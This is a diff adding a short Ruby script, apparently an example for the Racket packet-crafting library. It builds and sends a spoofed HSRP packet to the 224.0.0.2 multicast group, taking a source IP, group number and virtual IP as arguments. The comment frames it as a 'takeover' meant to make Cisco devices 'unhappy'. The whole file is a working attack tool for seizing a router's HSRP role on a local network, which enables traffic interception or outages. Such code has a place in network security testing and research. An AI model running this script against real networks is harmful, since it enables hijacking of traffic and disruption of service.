@@ -1,0 +1,39 @@
+#!/usr/bin/env ruby
+#
+# Make all of your Cisco devices unhappy by hurling HSRP packets
+# at them.  Hot, Hot HSRP takeover.
+require 'rubygems'
+require 'racket'
+
+unless (ARGV.size == 3)
+  puts "Usage: $0 <srcip> <group> <vip>"
+  exit
+end
+
+n = Racket.new
+n.iface = "eth0"
+
+n.l2 = Ethernet.new(Misc.randstring(14))
+n.l2.ethertype = 0x0800
+n.l2.dst_mac = "01:00:5e:00:00:02"
+
+n.l3 = IPv4.new
+n.l3.protocol = 17
+n.l3.dst_ip = "224.0.0.2"
+n.l3.src_ip = ARGV[0]
+
+n.l4 = UDP.new
+n.l4.src_port = 1985
+n.l4.dst_port = 1985
+
+n.l5 = HSRP.new
+n.l5.vip = ARGV[2]
+n.l5.group = ARGV[1].to_i
+
+n.l4.payload = n.l5
+n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
+n.l4.payload = ""
+
+n.sendpacket
+
+puts n.pretty
